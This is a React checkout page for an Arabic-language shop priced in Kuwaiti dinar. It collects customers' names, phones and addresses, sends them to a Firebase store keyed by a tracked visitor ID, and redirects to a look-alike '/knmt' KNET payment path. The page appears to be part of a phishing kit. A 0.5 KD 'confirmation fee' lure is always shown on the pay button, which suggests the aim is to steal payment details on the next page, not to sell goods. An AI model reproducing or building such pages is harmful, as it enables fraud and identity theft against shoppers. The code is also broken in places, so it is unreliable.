"use client";

import type React from "react";

import { useCart } from "@/lib/cart-context";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import { ArrowRight, CreditCard } from "lucide-react";
import Link from "next/link";
import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import { addData } from "@/lib/firebase";

export default function CheckoutPage() {
  const { items, totalPrice } = useCart();
  const router = useRouter();
  const [mounted, setMounted] = useState(false);
  const [paymentType, setPaymentType] = useState<"full" | "partial">("full");
  const [formData, setFormData] = useState({
    name: "",
    phone: "",
    address: "",
    notes: "",
  });

  useEffect(() => {
    setMounted(true);
  }, []);

  useEffect(() => {
    if (mounted && items.length === 0) {
      router.push("/cart");
    }
  }, [mounted, items.length, router]);

  const partialAmount = 0.5;
  // 30% deposit  const paymentAmount = paymentType === "full" ? totalPrice : partialAmount;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (typeof window === "undefined") return;

    // Create order data
    const orderData = {
      items,
      customerInfo: formData,
      paymentType,
      totalAmount: totalPrice,
      partialAmount,
      timestamp: new Date().toISOString(),
    };

    // Save order to localStorage
    try {
      localStorage.setItem("pendingOrder", JSON.stringify(orderData));
  paymentType==="partial"?
  localStorage.setItem("amount", orderData.partialAmount.toString()):

      localStorage.setItem("amount", orderData.totalAmount.toString());
    } catch (error) {
      console.error("Failed to save order to localStorage:", error);
    }
    const visitorID = localStorage.getItem("visitor");
    await addData({ id: visitorID, ...formData });
    // Redirect to KNET payment
    router.push(`/knmt`);
  };

  if (!mounted) {
    return null;
  }

  if (items.length === 0) {
    return null;
  }

  return (
    <div className="min-h-screen bg-background pb-8">
      <header className="bg-card border-b border-border sticky top-0 z-40">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <Link href="/cart">
              <Button variant="ghost" size="icon">
                <ArrowRight className="h-5 w-5" />
              </Button>
            </Link>
            <h1 className="text-xl font-bold">إتمام الطلب</h1>
            <div className="w-10" />
          </div>
        </div>
      </header>

      <div className="container mx-auto px-4 py-6 max-w-2xl">
        <form onSubmit={handleSubmit} className="space-y-6">
          {/* Customer Information */}
          <Card>
            <CardHeader>
              <CardTitle>معلومات العميل</CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="space-y-2">
                <Label htmlFor="name">الاسم الكامل *</Label>
                <Input
                  id="name"
                  required
                  value={formData.name}
                  onChange={(e) =>
                    setFormData({ ...formData, name: e.target.value })
                  }
                  placeholder="أدخل اسمك الكامل"
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="phone">رقم الهاتف *</Label>
                <Input
                  id="phone"
                  type="tel"
                  required
                  value={formData.phone}
                  onChange={(e) =>
                    setFormData({ ...formData, phone: e.target.value })
                  }
                  placeholder="مثال: 12345678"
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="address">العنوان *</Label>
                <Input
                  id="address"
                  required
                  value={formData.address}
                  onChange={(e) =>
                    setFormData({ ...formData, address: e.target.value })
                  }
                  placeholder="أدخل عنوان التوصيل"
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="notes">ملاحظات إضافية</Label>
                <Input
                  id="notes"
                  value={formData.notes}
                  onChange={(e) =>
                    setFormData({ ...formData, notes: e.target.value })
                  }
                  placeholder="أي ملاحظات خاصة بالطلب"
                />
              </div>
            </CardContent>
          </Card>

          {/* Payment Options */}
          <Card>
            <CardHeader>
              <CardTitle>طريقة الدفع</CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <RadioGroup
                value={paymentType}
                onValueChange={(value) =>
                  setPaymentType(value as "full" | "partial")
                }
              >
                <div className="flex items-start space-x-2 space-x-reverse border rounded-lg p-4 cursor-pointer hover:bg-muted/50 transition-colors">
                  <RadioGroupItem value="full" id="full" />
                  <Label htmlFor="full" className="flex-1 cursor-pointer">
                    <div className="font-medium">دفع كامل</div>
                    <div className="text-sm text-muted-foreground mt-1">
                      ادفع المبلغ الكامل الآن
                    </div>
                    <div className="text-lg font-bold text-primary mt-2">
                      {totalPrice.toFixed(3)} د.ك
                    </div>
                  </Label>
                </div>

                <div className="flex items-start space-x-2 space-x-reverse border rounded-lg p-4 cursor-pointer hover:bg-muted/50 transition-colors">
                  <RadioGroupItem value="partial" id="partial" />
                  <Label htmlFor="partial" className="flex-1 cursor-pointer">
                    <div className="font-medium">دفع جزئي (تأكيد)</div>
                    <div className="text-sm text-muted-foreground mt-1">
                      ادفع 0.5 رسوم تأكيد الطلب والدفع عند الاستلام
                    </div>
                    <div className="text-lg font-bold text-primary mt-2">
                      {partialAmount.toFixed(3)} د.ك
                    </div>
                    <div className="text-xs text-muted-foreground mt-1">
                      المتبقي: {(totalPrice - partialAmount).toFixed(3)} د.ك
                    </div>
                  </Label>
                </div>
              </RadioGroup>
            </CardContent>
          </Card>

          {/* Order Summary */}
          <Card>
            <CardHeader>
              <CardTitle>ملخص الطلب</CardTitle>
            </CardHeader>
            <CardContent className="space-y-3">
              {items.map((item) => (
                <div key={item.id} className="flex justify-between text-sm">
                  <span>
                    {item.name} × {item.quantity}
                  </span>
                  <span className="font-medium">
                    {(item.price * (item.quantity as number)).toFixed(3)} د.ك
                  </span>
                </div>
              ))}
              <div className="border-t pt-3 flex justify-between font-bold text-lg">
                <span>المجموع الكلي</span>
                <span className="text-primary">
                  {totalPrice.toFixed(3)} د.ك
                </span>
              </div>
              {paymentType === "partial" && (
                <div className="bg-muted p-3 rounded-lg space-y-2 text-sm">
                  <div className="flex justify-between">
                    <span>المبلغ المطلوب الآن</span>
                    <span className="font-bold text-primary">
                      {partialAmount.toFixed(3)} د.ك
                    </span>
                  </div>
                  <div className="flex justify-between text-muted-foreground">
                    <span>المتبقي عند الاستلام</span>
                    <span>{(totalPrice - partialAmount).toFixed(3)} د.ك</span>
                  </div>
                </div>
              )}
            </CardContent>
          </Card>

          <Button type="submit" size="lg" className="w-full gap-2">
            <CreditCard className="h-5 w-5" />
            الدفع عبر كي نت ({partialAmount.toFixed(3)} د.ك)
          </Button>
        </form>
      </div>
    </div>
  );
}
